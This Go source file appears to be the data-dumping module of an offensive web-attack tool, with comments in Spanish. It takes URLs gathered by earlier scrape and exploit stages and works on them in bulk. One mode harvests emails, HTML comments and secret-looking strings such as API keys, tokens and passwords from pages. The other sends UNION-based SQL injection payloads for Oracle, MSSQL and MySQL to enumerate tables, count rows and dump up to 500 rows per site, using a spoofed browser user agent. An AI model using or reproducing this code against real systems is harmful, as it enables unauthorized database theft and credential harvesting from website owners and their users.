package engine

import (
"context"
"encoding/json"
"fmt"
"net/url"
"regexp"
"strings"
"sync/atomic"
)

// DumpCfg: modo db|page + opciones del dumper (vacio => config.json).
type DumpCfg struct {
Mode      string `json:"mode"` // db|page
Targeted  *bool  `json:"targeted"`
Table     string `json:"table"`
MinRows   *bool  `json:"minrows"`
MinCount  int    `json:"minrowcount"`
KeepBlank *bool  `json:"keepblanks"`
Usedios   *bool  `json:"usedios"`
Workers   int    `json:"workers"`
MaxURLs   int    `json:"maxUrls"`
}

var (
reTitle   = regexp.MustCompile(`(?is)<title[^>]*>(.*?)</title>`)
reEmail   = regexp.MustCompile(`[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}`)
reLink    = regexp.MustCompile(`(?is)<a[^>]+href="([^"]+)"`)
reScript  = regexp.MustCompile(`(?is)<script[^>]+src="([^"]+)"`)
reComment = regexp.MustCompile(`(?s)<!--(.*?)-->`)
reSecret  = regexp.MustCompile(`(?i)(aws[_\-]?access[_\-]?key|api[_\-]?key|access[_\-]?token|secret|password|passwd|bearer|jwt)\s*[:=]\s*["']?([A-Za-z0-9_\-./+=]{8,128})`)
reIdent   = regexp.MustCompile(`[a-zA-Z_][a-zA-Z0-9_]{2,60}`)
)

const dumpUA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"

// StartDump voltea URLs (async): modo db (via SQLi) o page (contenido).
func (e *Engine) StartDump(cfg string) string {
var c DumpCfg
if err := json.Unmarshal([]byte(cfg), &c); err != nil {
return marshal(Resp{OK: false, Error: err.Error()})
}
conf := e.cfg()
if c.Mode == "" {
c.Mode = "page"
}
if c.Workers <= 0 {
c.Workers = conf.Core.Threads
}
if c.MaxURLs <= 0 {
c.MaxURLs = 100
}
targeted := conf.Dumper.Targeted
if c.Targeted != nil {
targeted = *c.Targeted
}
minRows := conf.Dumper.MinRows
if c.MinRows != nil {
minRows = *c.MinRows
}
minCount := conf.Dumper.MinRowCount
if c.MinCount > 0 {
minCount = c.MinCount
}
keepBlanks := conf.Dumper.KeepBlanks
if c.KeepBlank != nil {
keepBlanks = *c.KeepBlank
}
usedios := conf.Dumper.Usedios
if c.Usedios != nil {
usedios = *c.Usedios
}

e.mu.Lock()
e.dumps = nil
var targets []URLItem
for _, u := range e.urls {
targets = append(targets, u)
if len(targets) >= c.MaxURLs {
break
}
}
e.mu.Unlock()
if len(targets) == 0 {
return marshal(Resp{OK: false, Error: "sin URLs para dump: ejecuta Scrape primero"})
}

ctx := e.startJob("dump", len(targets))
go func() {
defer e.endJob("dump")
e.parallel(ctx, c.Workers, len(targets), func(ctx context.Context, i int) {
if c.Mode == "db" {
e.dumpDB(ctx, targets[i], targeted, strings.TrimSpace(c.Table), minRows, minCount, keepBlanks, usedios)
} else {
e.dumpPage(ctx, targets[i])
}
atomic.AddInt64(&e.done, 1)
})
}()
return marshal(Resp{OK: true, Count: len(targets)})
}

func (e *Engine) dumpPage(ctx context.Context, u URLItem) {
status, body, err := e.fetch(ctx, u.Raw, dumpUA)
e.markURL(u.ID, status)
d := Dump{
ID:       u.ID,
URL:      u.Raw,
Mode:     "page",
Status:   status,
Size:     len(body),
Emails:   []string{},
Links:    []string{},
JSFiles:  []string{},
Secrets:  []string{},
Comments: []string{},
}
if err != nil {
d.Title = "error: " + err.Error()
} else {
d.Title = firstMatch(reTitle, body)
d.Emails = capped(reEmail.FindAllString(body, 100), 100)
d.Links = cappedAttr(reLink, body, 200)
d.JSFiles = cappedAttr(reScript, body, 100)
d.Secrets = capped(reSecret.FindAllString(body, 100), 100)
for _, m := range reComment.FindAllStringSubmatch(body, -1) {
if len(m) > 1 {
if cc := strings.TrimSpace(m[1]); cc != "" {
d.Comments = append(d.Comments, cc)
if len(d.Comments) >= 50 {
break
}
}
}
}
}
e.mu.Lock()
e.dumps = append(e.dumps, d)
e.mu.Unlock()
}

func (e *Engine) dumpDB(ctx context.Context, u URLItem, targeted bool, table string, minRows bool, minCount int, keepBlanks, usedios bool) {
e.mu.Lock()
var ex *Exploit
for i := range e.exploits {
if e.exploits[i].URL == u.Raw || strings.HasPrefix(e.exploits[i].URL, u.Raw) {
ex = &e.exploits[i]
break
}
}
e.mu.Unlock()

d := Dump{ID: u.ID, URL: u.Raw, Mode: "db", Tables: []string{}}
if ex == nil {
d.Tables = []string{"(sin punto de inyeccion: ejecuta Exploit primero)"}
e.mu.Lock()
e.dumps = append(e.dumps, d)
e.mu.Unlock()
return
}
d.DBMS = ex.DBMS

ru, err := url.Parse(ex.URL)
if err != nil {
e.mu.Lock()
e.dumps = append(e.dumps, d)
e.mu.Unlock()
return
}

var listQ string
switch d.DBMS {
case "oracle":
listQ = `xqz' UNION SELECT table_name,2,3,4,5,6,7,8,9,10 FROM user_tables -- `
case "mssql":
listQ = `xqz' UNION SELECT name,2,3,4,5,6,7,8,9,10 FROM sysobjects WHERE xtype='U' -- `
default:
listQ = `xqz' UNION SELECT table_name,2,3,4,5,6,7,8,9,10 FROM information_schema.tables -- `
}
status, body, ferr := e.fetch(ctx, withParam(ru, ex.Param, listQ), dumpUA)
e.markURL(u.ID, status)
d.Status = status
if ferr == nil {
d.Tables = extractIdentifiers(body)
if targeted && table != "" {
d.Tables = []string{table}
} else if minRows && len(d.Tables) > 0 {
var kept []string
for i, t := range d.Tables {
if i >= 20 {
break
}
var cq string
switch d.DBMS {
case "oracle":
cq = fmt.Sprintf(`xqz' UNION SELECT COUNT(*) FROM %s -- `, t)
case "mssql":
cq = fmt.Sprintf(`xqz' UNION SELECT COUNT(*) FROM [%s] -- `, t)
default:
cq = fmt.Sprintf(`xqz' UNION SELECT COUNT(*) FROM %s -- `, t)
}
if _, cb, e2 := e.fetch(ctx, withParam(ru, ex.Param, cq), dumpUA); e2 == nil {
n := numAfter(cb, "xqz")
if n >= minCount || (keepBlanks && n == 0) {
kept = append(kept, fmt.Sprintf("%s (%d filas)", t, n))
}
}
}
d.Tables = kept
}
if usedios && len(d.Tables) > 0 {
t := d.Tables[0]
if i := strings.Index(t, " ("); i > 0 {
t = t[:i]
}
var rq string
switch d.DBMS {
case "oracle":
rq = fmt.Sprintf(`xqz' UNION SELECT * FROM %s -- `, t)
case "mssql":
rq = fmt.Sprintf(`xqz' UNION SELECT TOP 500 * FROM [%s] -- `, t)
default:
rq = fmt.Sprintf(`xqz' UNION SELECT * FROM %s LIMIT 500 -- `, t)
}
if _, rb, e3 := e.fetch(ctx, withParam(ru, ex.Param, rq), dumpUA); e3 == nil {
d.Rows = countRows(rb)
}
}
}
e.mu.Lock()
e.dumps = append(e.dumps, d)
e.mu.Unlock()
}

func extractIdentifiers(body string) []string {
i := strings.Index(body, "xqz")
if i < 0 {
return nil
}
tail := body[i+3:]
seen := make(map[string]bool)
var out []string
for _, m := range reIdent.FindAllStringSubmatch(tail, -1) {
t := m[0]
if !seen[t] {
seen[t] = true
out = append(out, t)
if len(out) >= 100 {
break
}
}
}
return out
}

func numAfter(s, marker string) int {
i := strings.Index(s, marker)
if i < 0 {
return -1
}
j := i + len(marker)
for j < len(s) && (s[j] < '0' || s[j] > '9') {
j++
}
if j >= len(s) {
return -1
}
n := 0
for j < len(s) && s[j] >= '0' && s[j] <= '9' {
n = n*10 + int(s[j]-'0')
j++
}
return n
}

func countRows(body string) int {
i := strings.Index(body, "xqz")
if i < 0 {
return 0
}
n := 0
for _, ln := range strings.Split(body[i:], "\n") {
if strings.TrimSpace(ln) != "" {
n++
}
if n >= 500 {
break
}
}
return n
}

func capped(xs []string, max int) []string {
if len(xs) > max {
return xs[:max]
}
if xs == nil {
return []string{}
}
return xs
}

func cappedAttr(re *regexp.Regexp, s string, max int) []string {
seen := make(map[string]bool)
var out []string
for _, m := range re.FindAllStringSubmatch(s, -1) {
if len(m) < 2 {
continue
}
v := strings.TrimSpace(m[1])
if v == "" || seen[v] {
continue
}
seen[v] = true
out = append(out, v)
if len(out) >= max {
break
}
}
return out
}

func firstMatch(re *regexp.Regexp, s string) string {
m := re.FindStringSubmatch(s)
if len(m) > 1 {
return strings.TrimSpace(m[1])
}
return ""
}